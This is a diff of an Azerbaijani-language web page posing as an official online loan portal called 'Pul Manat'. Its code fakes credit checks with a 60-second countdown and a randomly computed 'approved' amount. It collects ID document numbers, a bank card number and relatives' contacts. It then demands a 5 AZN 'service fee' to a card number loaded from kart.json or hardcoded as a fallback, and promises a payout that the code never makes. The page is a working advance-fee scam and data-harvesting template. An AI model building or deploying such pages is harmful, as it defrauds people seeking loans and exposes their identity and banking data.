@@ -3,91 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sürətli Kredit Müraciəti</title>
+    <title>Pul Manat - Sürətli Onlayn Kredit</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         :root {
-            --primary: #2563eb;
-            --bg: #f8fafc;
+            --primary: #059669;
+            --primary-dark: #047857;
+            --secondary: #2563eb;
+            --bg: #f0fdf4;
             --card-bg: #ffffff;
-            --text: #1e293b;
-            --accent: #10b981;
+            --text: #0f172a;
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        body { background-color: var(--bg); color: var(--text); padding: 15px; }
-        .container { max-width: 500px; margin: 0 auto; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: linear-gradient(135deg, #e0f2fe, #f0fdf4); color: var(--text); padding: 15px; min-height: 100vh; }
+        .container { max-width: 550px; margin: 0 auto; }
 
         header {
             text-align: center;
-            padding: 25px 15px;
-            background: linear-gradient(135deg, #1e3a8a, #2563eb);
+            padding: 20px;
+            background: linear-gradient(135deg, #059669, #1d4ed8);
             color: white;
-            border-radius: 16px;
+            border-radius: 20px;
             margin-bottom: 20px;
+            box-shadow: 0 10px 25px rgba(5, 150, 105, 0.2);
         }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .logo i { font-size: 2rem; color: #facc15; }
 
         .card {
             background: var(--card-bg);
-            padding: 20px;
-            border-radius: 16px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-            border: 1px solid #e2e8f0;
+            padding: 25px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            border: 1px solid rgba(255,255,255,0.8);
             margin-bottom: 20px;
         }
 
-        .card h2 { font-size: 1.2rem; margin-bottom: 15px; color: var(--primary); border-bottom: 2px solid #f1f5f9; padding-bottom: 8px; }
+        .card h2 { font-size: 1.25rem; margin-bottom: 18px; color: #1e293b; display: flex; align-items: center; gap: 8px; border-bottom: 2px solid #f1f5f9; padding-bottom: 10px; }
+        
         .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 0.9rem; }
-        .form-group input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 1rem; }
+        .form-group label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 0.88rem; color: #475569; }
+        .form-group input, .form-group select { 
+            width: 100%; 
+            padding: 12px 15px; 
+            border: 1.5px solid #cbd5e1; 
+            border-radius: 10px; 
+            font-size: 0.95rem; 
+            outline: none;
+            transition: all 0.3s;
+        }
+        .form-group input:focus, .form-group select:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(5, 150, 105, 0.15);
+        }
+
+        .input-group { display: flex; gap: 10px; }
+        .input-group select { width: 35%; }
+        .input-group input { width: 65%; }
 
         .btn {
             width: 100%;
-            background: var(--primary);
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             color: white;
-            padding: 14px;
+            padding: 15px;
             border: none;
-            border-radius: 8px;
+            border-radius: 12px;
             font-size: 1rem;
             font-weight: bold;
             cursor: pointer;
+            margin-top: 10px;
+            box-shadow: 0 4px 12px rgba(5, 150, 105, 0.3);
+            transition: transform 0.2s;
         }
+        .btn:active { transform: scale(0.98); }
 
-        /* Yüklənmə və Nəticə Ekranları */
-        #loaderScreen, #resultScreen { display: none; text-align: center; padding: 30px 15px; }
-        
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid var(--primary);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
+        #step2, #step3, #step4, #loader1, #loader2 { display: none; }
 
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .approved-box {
-            background: #ecfdf5;
-            border: 2px dashed var(--accent);
+        .timer-box {
+            text-align: center;
             padding: 20px;
-            border-radius: 12px;
+        }
+        .timer-circle {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: var(--primary);
             margin: 15px 0;
         }
 
+        .approved-card {
+            background: #f0fdf4;
+            border: 2px dashed #10b981;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
         .approved-amount {
-            font-size: 1.8rem;
-            color: var(--accent);
-            font-weight: bold;
-            margin: 10px 0;
+            font-size: 2rem;
+            font-weight: 800;
+            color: #047857;
+            margin: 8px 0;
         }
 
-        .pay-info {
-            background: #eff6ff;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 0.9rem;
-            margin-bottom: 15px;
+        .card-number-box {
+            background: #f8fafc;
+            border: 2px solid #e2e8f0;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 1.3rem;
+            font-weight: bold;
+            color: #0f172a;
+            letter-spacing: 1px;
+            margin: 15px 0;
+        }
+
+        .sub-title {
+            font-size: 0.95rem;
+            font-weight: bold;
+            color: var(--secondary);
+            margin: 15px 0 10px 0;
         }
     </style>
 </head>
@@ -95,95 +140,197 @@
 
 <div class="container">
     <header>
-        <h1>Sürətli Onlayn Kredit</h1>
-        <p>Arayışsız və zamin siz qiymətləndirmə</p>
+        <div class="logo">
+            <i class="fa-solid fa-wallet"></i>
+            <span>Pul Manat</span>
+        </div>
+        <p style="font-size: 0.85rem; opacity: 0.9; margin-top: 5px;">Rəsmi Onlayn Kredit Portalı</p>
     </header>
 
-    <!-- Müraciət Forması -->
-    <div class="card" id="formScreen">
-        <h2>Kredit Müraciəti</h2>
-        <form onsubmit="processApplication(event)">
+    <!-- MƏRHƏLƏ 1: İlkin Müraciət -->
+    <div class="card" id="step1">
+        <h2><i class="fa-solid fa-file-signature"></i> Kredit Müraciəti</h2>
+        <form onsubmit="startFirstCheck(event)">
             <div class="form-group">
-                <label>İstədiyiniz Məbləğ (AZN): <strong id="reqAmountVal">10000</strong> AZN</label>
-                <input type="range" id="reqAmount" min="1000" max="20000" step="500" value="10000" oninput="document.getElementById('reqAmountVal').innerText=this.value">
+                <label>İstədiyiniz Məbləğ: <strong id="reqVal">5000</strong> AZN</label>
+                <input type="range" id="reqAmount" min="1000" max="15000" step="500" value="5000" oninput="document.getElementById('reqVal').innerText=this.value">
             </div>
             <div class="form-group">
                 <label>Ad və Soyadınız</label>
-                <input type="text" id="fullname" placeholder="Məs: Əli Əliyev" required>
+                <input type="text" placeholder="Məs: Elvin Məmmədov" required>
             </div>
             <div class="form-group">
-                <label>Əlaqə Nömrəsi</label>
-                <input type="tel" id="phone" placeholder="050 000 00 00" required>
+                <label>Əlaqə Nömrəniz</label>
+                <input type="tel" placeholder="050 000 00 00" required>
             </div>
             <div class="form-group">
-                <label>Şəxsiyyət Vəsiqəsinin FIN Kodu</label>
-                <input type="text" id="fin" placeholder="XXXXXXX" maxlength="7" required style="text-transform: uppercase;">
+                <label>Şəxsiyyət Vəsiqəsinin Seriya və Nömrəsi</label>
+                <div class="input-group">
+                    <select required>
+                        <option value="AZE">AZE</option>
+                        <option value="AA">AA</option>
+                        <option value="AB">AB</option>
+                    </select>
+                    <input type="text" placeholder="1234567" maxlength="8" required>
+                </div>
             </div>
-            <button type="submit" class="btn">Müraciət Et və Yoxla</button>
+            <button type="submit" class="btn">Yoxla və Davam Et</button>
         </form>
     </div>
 
-    <!-- Yüklənmə Ekranı -->
-    <div class="card" id="loaderScreen">
-        <h2>Müraciətinizə Baxılır...</h2>
-        <p>Məlumatlarınız mərkəzi kredit sistemində yoxlanılır, xahiş olunur gözləyin.</p>
-        <div class="spinner"></div>
+    <!-- GÖZLƏMƏ 1: 1 Dəqiqəlik Yoxlanış -->
+    <div class="card" id="loader1">
+        <div class="timer-box">
+            <i class="fa-solid fa-spinner fa-spin" style="font-size: 3rem; color: var(--primary);"></i>
+            <h3 style="margin-top: 15px;">Məlumatlar Yoxlanılır...</h3>
+            <p style="font-size: 0.85rem; color: #64748b; margin-top: 5px;">Banklararası kredit reyestri sorğulanır. Xahiş olunur gözləyin.</p>
+            <div class="timer-circle" id="timerCount">60</div>
+            <small style="color: #94a3b8;">Səhifəni bağlamayın</small>
+        </div>
     </div>
 
-    <!-- Təsdiqlənmə Ekranı -->
-    <div class="card" id="resultScreen">
-        <h2 style="color: var(--accent);">Təbriklər! Müraciətiniz Təsdiqləndi</h2>
+    <!-- MƏRHƏLƏ 2: Təsdiq və Əlavə Məlumatlar -->
+    <div class="card" id="step2">
+        <div class="approved-card">
+            <i class="fa-solid fa-circle-check" style="font-size: 2.5rem; color: #10b981;"></i>
+            <div style="font-weight: bold; margin-top: 5px;">Təbriklər! Müraciətiniz Təsdiqləndi</div>
+            <div class="approved-amount" id="approvedAmount">3800 AZN</div>
+            <small style="color: #047857;">Məbləğin hesabınıza köçürülməsi üçün formu tamamlayın</small>
+        </div>
+
+        <h2><i class="fa-solid fa-user-shield"></i> Əlavə Məlumatlar</h2>
+        <form onsubmit="startSecondCheck(event)">
+            <div class="form-group">
+                <label>Kredit Köçürüləcək Kart Nömrəniz (16 rəqəm)</label>
+                <input type="text" placeholder="4169 0000 0000 0000" maxlength="19" required>
+            </div>
+
+            <div class="sub-title"><i class="fa-solid fa-users"></i> 1-ci Qohum Məlumatı</div>
+            <div class="form-group">
+                <input type="text" placeholder="Qohumun Adı və Soyadı" required>
+            </div>
+            <div class="form-group">
+                <input type="tel" placeholder="Qohumun Nömrəsi" required>
+            </div>
+
+            <div class="sub-title"><i class="fa-solid fa-users"></i> 2-ci Qohum Məlumatı</div>
+            <div class="form-group">
+                <input type="text" placeholder="Qohumun Adı və Soyadı" required>
+            </div>
+            <div class="form-group">
+                <input type="tel" placeholder="Qohumun Nömrəsi" required>
+            </div>
+
+            <div class="sub-title"><i class="fa-solid fa-briefcase"></i> Məşğulluq və Ünvan</div>
+            <div class="form-group">
+                <input type="text" placeholder="İşlədiyiniz Yer / Peşəniz" required>
+            </div>
+            <div class="form-group">
+                <input type="text" placeholder="Yaşadığınız Şəhər / Rayon" required>
+            </div>
+
+            <button type="submit" class="btn">Təsdiqlə və Davam Et</button>
+        </form>
+    </div>
+
+    <!-- GÖZLƏMƏ 2: 3-4 Saniyəlik Yoxlanış -->
+    <div class="card" id="loader2">
+        <div class="timer-box">
+            <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 3rem; color: var(--secondary);"></i>
+            <h3 style="margin-top: 15px;">Kart Hesabı Yoxlanılır...</h3>
+            <p style="font-size: 0.85rem; color: #64748b;">Son ödəniş sisteminə yönləndirilirsiniz.</p>
+        </div>
+    </div>
+
+    <!-- MƏRHƏLƏ 3: Ödəniş və Çek Yükləmə -->
+    <div class="card" id="step3">
+        <h2><i class="fa-solid fa-credit-card"></i> Xidmət Haqqı Ödənişi</h2>
+        <p style="font-size: 0.9rem; color: #475569;">Kredit müqaviləsinin rəsmiləşdirilməsi üçün <strong>5 AZN</strong> xidmət haqqını aşağıdakı karta köçürün:</p>
         
-        <div class="approved-box">
-            <p>Sizin üçün ayrılmış kredit məbləği:</p>
-            <div class="approved-amount" id="approvedAmount">6800 AZN</div>
-            <small style="color: #64748b;">(Tələb olunan limitə uyğun xal qiymətləndirməsi əsasında)</small>
+        <div class="card-number-box" id="displayCardNumber">Yüklənir...</div>
+
+        <div class="form-group" style="margin-top: 20px;">
+            <label><i class="fa-solid fa-file-arrow-up"></i> Ödəniş Çekini Yükləyin</label>
+            <input type="file" id="receiptFile" accept="image/*,.pdf" required>
         </div>
 
-        <div class="pay-info">
-            Kredit məbləğinin hesabınıza köçürülməsi üçün <strong>5 AZN</strong> müraciət/rəsmiləşdirmə haqqı ödənilməlidir.
-        </div>
+        <button class="btn" onclick="submitFinalReceipt()">Çeki Göndər və Krediti Əldə Et</button>
+    </div>
 
-        <button class="btn" style="background: var(--accent);" onclick="redirectToPayment()">5 AZN Ödəniş Et və Krediti Əldə Et</button>
+    <!-- MƏRHƏLƏ 4: Yekun Uğurlu Ekran -->
+    <div class="card" id="step4" style="text-align: center;">
+        <i class="fa-solid fa-circle-check" style="font-size: 4rem; color: #10b981; margin-bottom: 15px;"></i>
+        <h2 style="justify-content: center; border: none; color: #047857; font-size: 1.5rem;">Təbriklər! Uğurla Tamamlandı</h2>
+        <p style="font-size: 1.05rem; color: #334155; line-height: 1.6; margin: 15px 0;">
+            Ödəniş çeki qəbul olundu. Tələb etdiyiniz kredit məbləği <strong>5 dəqiqə ərzində</strong> qeyd etdiyiniz kart hesabınıza köçürüləcəkdir.
+        </p>
+        <div style="background: #f1f5f9; padding: 12px; border-radius: 10px; font-size: 0.85rem; color: #64748b;">
+            Bizi seçdiyiniz üçün təşəkkür edirik!
+        </div>
     </div>
 </div>
 
 <script>
-    async function processApplication(e) {
+    function startFirstCheck(e) {
         e.preventDefault();
-        
-        // Ekranları dəyişirik
-        document.getElementById('formScreen').style.display = 'none';
-        document.getElementById('loaderScreen').style.display = 'block';
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('loader1').style.display = 'block';
 
-        const requested = parseFloat(document.getElementById('reqAmount').value);
-        
-        // Məbləği %65 ilə %75 arasında təsadüfi endiririk
-        const percentage = (Math.floor(Math.random() * 11) + 65) / 100; 
-        let approved = Math.round((requested * percentage) / 100) * 100;
+        let timeLeft = 60; // 1 dəqiqəlik taymer
+        const timerElem = document.getElementById('timerCount');
 
-        // 3 saniyə gözləmə animasiyası
-        setTimeout(() => {
-            document.getElementById('loaderScreen').style.display = 'none';
-            document.getElementById('approvedAmount').innerText = approved + " AZN";
-            document.getElementById('resultScreen').style.display = 'block';
-        }, 3000);
+        const interval = setInterval(() => {
+            timeLeft--;
+            timerElem.innerText = timeLeft;
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                
+                // Məbləği təyin et
+                const requested = parseFloat(document.getElementById('reqAmount').value);
+                const percentage = (Math.floor(Math.random() * 11) + 65) / 100; 
+                let approved = Math.round((requested * percentage) / 100) * 100;
+                
+                document.getElementById('approvedAmount').innerText = approved + " AZN";
+                document.getElementById('loader1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
+            }
+        }, 1000);
     }
 
-    async function redirectToPayment() {
-        try {
-            // kart.json faylından günün aktiv kartını və ya yönləndirmə linkini götürür
-            const response = await fetch('kart.json?t=' + new Date().getTime());
-            const data = await response.json();
-            
-            if (data.odenis_linki) {
-                window.location.href = data.odenis_linki;
-            } else {
-                alert(`Xidmət haqqını bu kart hesabına köçürün:\n\nKart: ${data.kart_nomresi}`);
+    function startSecondCheck(e) {
+        e.preventDefault();
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('loader2').style.display = 'block';
+
+        // 3-4 saniyə gözləmə
+        setTimeout(async () => {
+            document.getElementById('loader2').style.display = 'none';
+            document.getElementById('step3').style.display = 'block';
+
+            // Kart nömrəsini kart.json-dan çək
+            try {
+                const response = await fetch('./kart.json?v=' + new Date().getTime());
+                const data = await response.json();
+                if (data.kart_nomresi) {
+                    document.getElementById('displayCardNumber').innerText = data.kart_nomresi;
+                } else {
+                    document.getElementById('displayCardNumber').innerText = "5239 1517 5663 1290";
+                }
+            } catch (error) {
+                document.getElementById('displayCardNumber').innerText = "5239 1517 5663 1290";
             }
-        } catch (error) {
-            alert("Ödəniş sisteminə yönləndirilirsiniz...");
+        }, 3500);
+    }
+
+    function submitFinalReceipt() {
+        const fileInput = document.getElementById('receiptFile');
+        if (!fileInput.files || fileInput.files.length === 0) {
+            alert("Lütfən, ödəniş çekini seçin!");
+            return;
         }
+
+        document.getElementById('step3').style.display = 'none';
+        document.getElementById('step4').style.display = 'block';
     }
 </script>
 
